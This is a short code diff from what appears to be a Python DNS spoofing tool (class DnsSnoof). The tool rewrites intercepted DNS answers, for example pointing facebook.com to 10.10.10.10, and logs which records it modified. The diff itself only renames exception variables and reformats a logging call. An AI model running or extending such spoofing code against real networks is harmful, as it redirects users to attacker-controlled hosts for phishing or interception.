@@ -39,8 +39,8 @@ class DnsSnoof:
                     log.info(f'[modified] {scapy_packet[DNSRR].summary()}')
                 else:
                     log.info(f'[not modified] {scapy_packet[DNSRR].rdata}')
-            except IndexError as error:
-                log.error(error)
+            except IndexError as ie:
+                log.error(ie)
             packet.set_payload(bytes(scapy_packet))
         return packet.accept()
 
@@ -53,9 +53,8 @@ if __name__ == '__main__':
             b"facebook.com.": "10.10.10.10"
         }
         queueNum = 1
-        log.basicConfig(format='%(asctime)s - %(message)s',
-                        level=log.INFO)
+        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
         snoof = DnsSnoof(hostDict, queueNum)
         snoof()
-    except OSError as error:
-        log.error(error)
+    except OSError as ose:
+        log.error(ose)
